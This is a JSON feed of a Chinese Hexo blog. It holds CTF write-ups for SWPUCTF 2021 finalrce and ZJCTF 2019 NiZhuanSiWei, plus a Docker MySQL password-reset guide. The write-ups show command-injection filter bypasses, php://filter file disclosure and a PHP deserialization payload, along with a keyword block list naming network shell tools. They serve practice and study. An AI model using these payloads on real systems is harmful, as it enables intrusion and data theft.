{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo",
    "subtitle": "",
    "icon": "http://example.com/images/favicon.ico",
    "description": "家里蹲，死肥宅",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/07/17/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce/",
            "url": "http://example.com/2024/07/17/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce/",
            "title": "[SWPUCTF 2021 新生赛]finalrce",
            "date_published": "2024-07-17T15:12:12.000Z",
            "content_html": "<p>进入网站页面后显示 php 代码:</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;url&#x27;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$url</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\&quot;|\\&gt;|\\&lt;|\\%|\\$/i&#x27;</span>,<span class=\"variable\">$url</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Can you see anything?&quot;</span>;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">exec</span>(<span class=\"variable\">$url</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure></p>\n<p>可以看到其中 preg_match 过滤了基本的一些命令，想要通过 exec 执行需要绕过去。<br />\n测试以下命令，发现不能执行：</p>\n<blockquote>\n<p>?url=ls;sleep 5</p>\n</blockquote>\n<p>对 ls 取反，继续执行：</p>\n<blockquote>\n<p>?url=%93%8C;sleep 5</p>\n</blockquote>\n<p>发现可以执行。其中英文字母的 url 编码为 16 进制前添加 %。<br />\n接下来使用 tee 命令将标准输入中的数据写入输出文件中:</p>\n<blockquote>\n<p>?url=l''s /|tee 1.txt</p>\n</blockquote>\n<p>访问 http://ip:port/?1.txt 可以看到根目录下的所有文件夹。<br />\n由于 cat 被过滤了，使用 tac 反向显示文件内容：</p>\n<blockquote>\n<p>?url=tac /file|tee 2.txt</p>\n</blockquote>\n",
            "tags": [
                "网络安全",
                "SWPUCTF 2021"
            ]
        },
        {
            "id": "http://example.com/2024/07/03/ZJCTF-2019-NiZhuanSiWei-KiHanahare%E7%9A%84WriteUp/",
            "url": "http://example.com/2024/07/03/ZJCTF-2019-NiZhuanSiWei-KiHanahare%E7%9A%84WriteUp/",
            "title": "[ZJCTF 2019]NiZhuanSiWei KiHanahare的WriteUp",
            "date_published": "2024-07-03T14:35:15.000Z",
            "content_html": "<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$text</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;text&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;file&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;password&quot;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$text</span>)&amp;&amp;(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$text</span>,<span class=\"string\">&#x27;r&#x27;</span>)===<span class=\"string\">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$text</span>,<span class=\"string\">&#x27;r&#x27;</span>).<span class=\"string\">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/&quot;</span>,<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Not now!&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        <span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$password</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>通过代码可以知道首要的目标是进入第一个 if 中，进入的条件是满足 text 是被设置了值的且该值为 &quot;welcome to the zjctf&quot;。<br />\n进入该条件中需要用到 data:// 协议</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data:<span class=\"comment\">//协议</span></span><br><span class=\"line\">需要allow_url_fopen,allow_url_include均为on</span><br><span class=\"line\">这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用的方式如下：  </span><br><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br><span class=\"line\">text/plain,表示的是文本  </span><br><span class=\"line\">text/plain;base64，若纯文本没用可用base64编码</span><br></pre></td></tr></table></figure></p>\n<p>使用以下地址可以进入 if 语句中</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//ip:port/?texdata://text/plain,welcome to the zjctf</span></span><br></pre></td></tr></table></figure></p>\n<p>进入语句之后中看到有 preg_match，该方法与正则表达相关会过滤 '/flag/'。<br />\ninclude () 方法一般存在漏洞可以利用，此处用 php://filter 协议。</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php:<span class=\"comment\">//filter的用法如下：</span></span><br><span class=\"line\">www.ip:port/?file=php:<span class=\"comment\">//filter/convert.base64-encode/resource==index.php</span></span><br><span class=\"line\">出来的是base64码需要解码</span><br><span class=\"line\">此协议不受allow_url_fopen,allow_url_include配置影响</span><br></pre></td></tr></table></figure></p>\n<p>构造 payload</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file=php:<span class=\"comment\">//filter/conver.base64-encode/resource=useless.php</span></span><br></pre></td></tr></table></figure></p>\n<p>输入之后得到 useless.php 的 base64 编码，解码后可得</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$file</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span>(<span class=\"params\"></span>)</span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>  </span><br></pre></td></tr></table></figure></p>\n<p>源码中 unserialize 方法能触发反序列化漏洞，因此利用 useless.php 里写的 file_get_contents 直接去读 flag.php，构造 payload</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$file</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;file = <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Flag</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"variable\">$b</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>   </span><br></pre></td></tr></table></figure></p>\n<p>得到</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">password=O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Flag%<span class=\"number\">22</span>%<span class=\"number\">3</span>A1%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>file%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A8%<span class=\"number\">3</span>A%<span class=\"number\">22</span>flag.php%<span class=\"number\">22</span>%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br></pre></td></tr></table></figure></p>\n<p>最终 payload 为</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text=data:<span class=\"comment\">//text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span></span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "网络安全",
                "ZJCTF 2019"
            ]
        },
        {
            "id": "http://example.com/2024/05/09/%E5%A6%82%E4%BD%95%E5%9C%A8docker%E4%B8%AD%E9%87%8D%E7%BD%AEmysql%E7%9A%84root%E5%AF%86%E7%A0%81/",
            "url": "http://example.com/2024/05/09/%E5%A6%82%E4%BD%95%E5%9C%A8docker%E4%B8%AD%E9%87%8D%E7%BD%AEmysql%E7%9A%84root%E5%AF%86%E7%A0%81/",
            "title": "如何在docker中重置mysql的root密码",
            "date_published": "2024-05-09T15:45:55.000Z",
            "content_html": "<h1 id=\"遇到的问题\"><a class=\"anchor\" href=\"#遇到的问题\">#</a> 遇到的问题</h1>\n<p>长期未使用 mysql 导致忘记了 root 密码，多次尝试始终无法猜出设置的密码（晕），新建数据库又十分麻烦，故选择重置 root 密码。</p>\n<h1 id=\"解决方法\"><a class=\"anchor\" href=\"#解决方法\">#</a> 解决方法</h1>\n<ul>\n<li>进入 mysql 容器中：docker exec -it &lt;容器名&gt; bash</li>\n<li>查看 /etc/mysql/conf.d 下是否有 docker.cnf 文件，如果有则在文件末尾添加 skip-grant-tables（网上教程是如此，但本人未成功，没有 docker.cnf 这个文件，自己创建也不行）。如果修改 docker.cnf 不成功，可以尝试修改 /etc/my.cnf 文件，在其中添加 skip-grant-tables，注意不要添加在！includedir /etc/mysql/conf.d/ 后，会不成功的！</li>\n<li>修改后重启该数据库容器，使配置生效：docker restart &lt;容器名&gt;</li>\n<li>进入容器中，执行 mysql -hlocakhost -uroot -p，此时按回车即可，无需密码登录。</li>\n<li>由于在使用 --skip-grant-tables 选项启动服务时禁用了帐户管理，因此必须重新加载授权。 执行 flush privileges 这样就可以更改密码了。</li>\n<li>执行 ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_passowrd'; 即可更新密码。\n<ul>\n<li>有一点需要注意的是，在 5.7 版本以上，不再支持 (update user set password = password (' 你的新密码 ') where user = 'root';) 这种写法，换成如下这种写法 (update user set authentication_string=password ('123') where user='root');</li>\n</ul>\n</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/04/22/hello-world/",
            "url": "http://example.com/2024/04/22/hello-world/",
            "title": "Hello World",
            "date_published": "2024-04-22T14:03:55.581Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}